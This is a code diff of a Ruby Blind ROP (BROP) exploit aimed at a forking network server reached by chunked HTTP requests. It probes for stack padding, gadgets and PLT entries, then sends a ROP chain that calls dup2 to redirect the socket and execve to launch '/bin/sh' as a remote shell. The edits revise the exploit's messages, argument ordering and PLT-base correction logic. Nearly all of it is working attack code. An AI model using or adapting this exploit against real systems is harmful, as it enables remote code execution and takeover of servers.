@@ -76,7 +76,7 @@ def grab_socket()
 		end
 	end
 
-	abort("nope") if not got
+	abort("Couldn't get socket") if not got
 
 	return s
 end
@@ -96,7 +96,7 @@ def get_child()
 			print("Connect timeout\n")
 			next
 		rescue SystemCallError => e
-			print("Connect exception, err=#{e}\n")
+			print("\nConnect exception, err=#{e}\n")
 			exit(666)
 			next
 		end
@@ -130,19 +130,18 @@ def get_child()
 end
 
 def read_response(s)
-        cl = 0
-        while true
-				r = s.gets
-				if r == nil or r == "\r\n"
-					r = s.read(cl)
-					break
-				end
+	cl = 0
+	while true
+		r = s.gets
+		if r == nil or r == "\r\n"
+			r = s.read(cl)
+			break
+		end
 
-                if r.index("Content-Length") != nil
-                        cl = Integer(r.split()[1])
-                end
-                
-        end
+		if r.index("Content-Length") != nil
+			cl = Integer(r.split()[1])
+		end
+	end
 end
 
 def send_initial(s)
@@ -211,7 +210,7 @@ def check_vuln()
 	s.write("A\n")
 	s.flush()
 
-	abort("Not vuln") if not check_alive(s)
+	abort("Not vulnerable") if not check_alive(s)
 
 	s.close()
 
@@ -223,7 +222,7 @@ def check_vuln()
 	s.write("A" * 5000)
 	s.flush()
 
-	abort("Not vuln2") if check_alive(s)
+	abort("Overflow of 5000 didn't crash, assuming not vulnerable") if check_alive(s)
 
 	s.close()
 
@@ -236,7 +235,7 @@ def check_vuln()
 
 #	$to = 1
 
-	print("Vuln\n")
+	print("Vulnerable\n")
 
 	print("Timeout is #{$to}\n")
 end
@@ -362,7 +361,7 @@ def check_stack_depth()
 
 	while depth < max
 		print("Trying depth #{depth}\r")
-		rop = Array.new(depth) { |i| $ret }
+		rop = Array.new(depth) { |i| $plt }
 
 		s = get_child()
 		send_exp(s, rop)
@@ -373,7 +372,7 @@ def check_stack_depth()
 
 		depth += 1
 	end
-	print("\n")
+	print("\n\n")
 
 	abort("nope") if depth == max
 
@@ -387,53 +386,52 @@ def check_pad()
 	max = 100
 
 	while pad < max
-		print("Trying pad #{pad}\r")
-		rop = Array.new($depth) { |i| $ret }
+		rop = Array.new($depth) { |i| $plt }
 
 		for i in 0..pad
-			padval = $padval
-			rop[i] = padval
+			rop[i] = $padval
 		end
 
 		s = get_child()
 		send_exp(s, rop)
 
-		break if not check_alive(s)
+		alive = check_alive(s)
+		print("Trying pad #{pad}... alive = #{alive}\n")
+
+		break if not alive
 
 		s.close()
 
 		pad += 1
 	end
 
-	print("\n")
-
 	$pad = pad
 	$depth -= $pad
 
-	print("Depth #{$depth} pad #{$pad}\n")
+	print("\nDepth #{$depth} pad #{$pad}\n")
 
 	s.close()
 end
 
 def do_try_exp(rop)
-        s = get_child()
-        send_exp(s, rop)
+	s = get_child()
+	send_exp(s, rop)
 
-        alive = check_alive(s)
-        if not alive
+	alive = check_alive(s)
+	if not alive
 		s.close()
 		return false
 	end
 
-        req = "0\r\n"
-        req << "\r\n"
-        req << "GET #{$url} HTTP/1.1\r\n"
-        req << "Host: bla.com\r\n"
-        req << "Transfer-Encoding: Chunked\r\n"
-        req << "Connection: Keep-Alive\r\n"
-        req << "\r\n"
+	req = "0\r\n"
+	req << "\r\n"
+	req << "GET #{$url} HTTP/1.1\r\n"
+	req << "Host: bla.com\r\n"
+	req << "Transfer-Encoding: Chunked\r\n"
+	req << "Connection: Keep-Alive\r\n"
+	req << "\r\n"
 
-        s.write(req)
+	s.write(req)
 
 	alive = check_alive(s)
 	s.close()
@@ -455,14 +453,14 @@ def try_exp(rop)
 end
 
 def try_exp_print(addr, rop)
-        print("\rAddr 0x#{addr.to_s(16)} ... ")
+	print("\rAddr 0x#{addr.to_s(16)} ... ")
 
-        r = try_exp(rop)
+	r = try_exp(rop)
 
-        print("ret\n") if (r == true)
-        print("infinite loop\n") if (r == 2)
+	print("ret\n") if (r == true)
+	print("infinite loop\n") if (r == 2)
 
-        return r
+	return r
 end
 
 # dmccrady: Encapsulate all ROP call voodoo into one spot.
@@ -539,8 +537,8 @@ def plt_call_1(rop, fnIdx, arg1)
 end
 
 def plt_call_2(rop, fnIdx, arg1, arg2)
-	set_arg1(rop, arg1)
 	set_arg2(rop, arg2)
+	set_arg1(rop, arg1)
 	plt_fn(rop, fnIdx)
 end
 
@@ -548,8 +546,8 @@ end
 # of the third argument, it's an argument to 'strcmp'
 def plt_call_3(rop, fnIdx, arg1, arg2, arg3 = 0x400000)
 	set_arg3(rop, arg3)  # arg3 needs to be set first since it wlll clobber RDI and RSI calling strcmp
-	set_arg1(rop, arg1)
 	set_arg2(rop, arg2)
+	set_arg1(rop, arg1)
 	plt_fn(rop, fnIdx)
 end
 
@@ -1077,10 +1075,9 @@ def find_plt(dep = 0, start = $text, len = 0x10000)
 	plt += 0x5000  # dmccrady: cheat just to make it faster.
 	plte = plt + len
 
-	print("Finding plt #{plt.to_s(16)} - #{plte.to_s(16)}\n")
-
 	while true
 		for d in 0..dep
+			print("Trying PLT at #{plt.to_s(16)} and depth #{$depth+d}         \r")
 			if try_plt($depth + d, plt)
 				$plt = plt
 				# dmccrady: We found the PLT, but are actually one entry past the beginning
@@ -1091,7 +1088,7 @@ def find_plt(dep = 0, start = $text, len = 0x10000)
 				# the stop-gadget is the first actual PLT entry (i.e., simply pops).
 				$plt_stop_gadget = $plt_base + 0x10
 				$depth += d
-				print("Found PLT #{plt.to_s(16)} depth #{$depth}\n")
+				print("\nFound PLT at depth #{$depth}, base=#{$plt_base.to_s(16)}\n")
 				return
 			end
 		end
@@ -1109,7 +1106,7 @@ end
 def try_plt(depth, plt)
 	rop = Array.new(depth) { |i| plt }
 
-        r = try_exp_print(plt, rop)
+	r = try_exp(rop)
 	if r == true
 		rop = Array.new(depth) { |i| plt + 6 }
 
@@ -1180,9 +1177,9 @@ def find_write3()
 	print("Finding write (3)\n")
 
 	# dmccrady:  Hard-coded.  This works around a problem where, when scanning
-	# the PLT for 'write', we encounter 'memcpy_chk', which crashes the process
-	# and actually causes re-randomization.  Index 0x100 is known to lie beyond
-	# the poisonous entry
+	# the PLT for 'write', we encounter something like 'suspend' which hangs
+	# the victim's process.  Guess at a starting position thqt lies beyond
+	# the problem entries.
 	write_start = 0x10f
 	# dmcccrady:  Another hard-code.  The 'write' entry is known to lie within
 	# the first 0x300 entries.
@@ -1193,7 +1190,7 @@ def find_write3()
 	rep = rep.to_i
 
 	for write in write_start..write_last
-		for fd in 0..30
+		for fd in 3..50  # Try to guess the fd as well (skip 0,1, and 2)
 			return if try_write3(write, fd, rep, sl)
 		end
 	end
@@ -1460,6 +1457,8 @@ def verify_gadget(gadget)
 	left  = get_dist(gadget, -1)
 	right = get_dist(gadget, 1)
 
+	#print("Verifying gadget at #{gadget.to_s(16)}, left=#{left}, right=#{right}\n")
+
 	rdi = gadget + right - 1
 
 	if left + right == 6      # 6 pops from the standard BROP gadget
@@ -1487,6 +1486,7 @@ end
 
 def find_gadget()
 	return if $rdi
+
 	print("Finding gadget\n")
 
 	$start = $ret
@@ -1570,8 +1570,6 @@ def find_plt_depth()
 #	end
 
 	return if not $plt
-
-	$ret = $plt
 
 	check_pad()
 
@@ -1763,8 +1761,11 @@ def do_execve()
 	str = "/bin/sh\0"
 
 	rop = []
-	#plt_call_1(rop, $usleep, 1000 * 1000 * 30)
 
+			# DJM hack hack hack... The problem is, usleep isn't getting called or isn't doing anything.
+			#print("\nSleeping 10 s just for giggles\n")
+			#plt_call_1(rop, $usleep, 1000 * 1000 * 30)
+		
 	# Call dup2 to dup the victim's file descriptor to our known one.  Once we're in, we have control of stdin, stdout, and stderr.
 	#		dup2($file_desc, fd)
 	#		dup2(fd, 0)
@@ -1775,7 +1776,6 @@ def do_execve()
 	plt_call_2(rop, $dup2, fd, 1)
 	plt_call_2(rop, $dup2, fd, 2)
 	
-
 	# Write back the current contents of the writable location.
 	plt_call_3(rop, $write, fd, writable, $goodrdx)
 
@@ -1794,7 +1794,7 @@ def do_execve()
 	rop << $death
 
 	# Send the above shell-launching ROP to the target
-	print("Sending ROP chain:  write, sleep, read, write, execve\n")
+	print("Sending ROP chain:  write, usleep, read, write, execve\n")
 	s = get_child()
 	send_exp(s, rop)
 	x = s.recv(1)
@@ -1939,15 +1939,42 @@ end
 def got_sym(symno, symname)
 	if symname == "read"
 		$read = symno
-		print("Read at 0x#{$read.to_s(16)}\n")
+		print("Read at #{$read}\n")
 	elsif symname == "execve"
 		$execve = symno
-		print("Execve at 0x#{$execve.to_s(16)}\n")
+		print("Execve at #{$execve}\n")
 	elsif symname == "usleep"
 		$usleep = symno
-		print("usleep at 0x#{$usleep.to_s(16)}\n")
+		print("usleep at #{$usleep}\n")
+	elsif symname == "dup2"
+		$dup2_sym_no = symno
+		print("dup2 at #{symno}\n")
 	end
 end
+
+
+# dmccrady:  Up until now we have been calling PLT functions by an index relative to where we *think* the PLT base is.
+# We might be off.  If we are off, we'll see a difference between the relative indices and the symbol numbers we found
+# in the symbol table.  We'll use "dup2" as the standard, since we find it during the blind PLT search phase, and also
+# find it during the symbol table dump.
+def switch_to_fn_symbols()
+	abort("dup2 not found") if not $dup2
+	abort("dup2_sym_no not found") if not $dup2_sym_no
+
+	offset = $dup2 - $dup2_sym_no 
+	print("Adjusting PLT base by #{offset} entries... ")
+
+	$plt_base += offset * 0x10
+	print(" new PLT base at #{$plt_base.to_s(16)}\n")
+
+	# adjust the function indices of the PLT entries we found blind.
+	$strcmp -= offset
+	$dup2 -= offset
+	$write -= offset
+
+	print("New function indices:  strcmp=#{$strcmp}, dup2=#{$dup2}, write=#{$write}, read=#{$read}, execve=#{$execve}\n")
+end
+
 
 def read_sym()
 	print("Reading sym\n")
@@ -2272,7 +2299,9 @@ def pwn()
 
 	read_sym() if not $read
 
-	find_read() if not $read
+	# Adjust function entries that we found blindly so they match the function symbol numbers
+	# in the symbol table.  This will adjust the PLT base.
+	switch_to_fn_symbols()
 
 	print_progress()
 
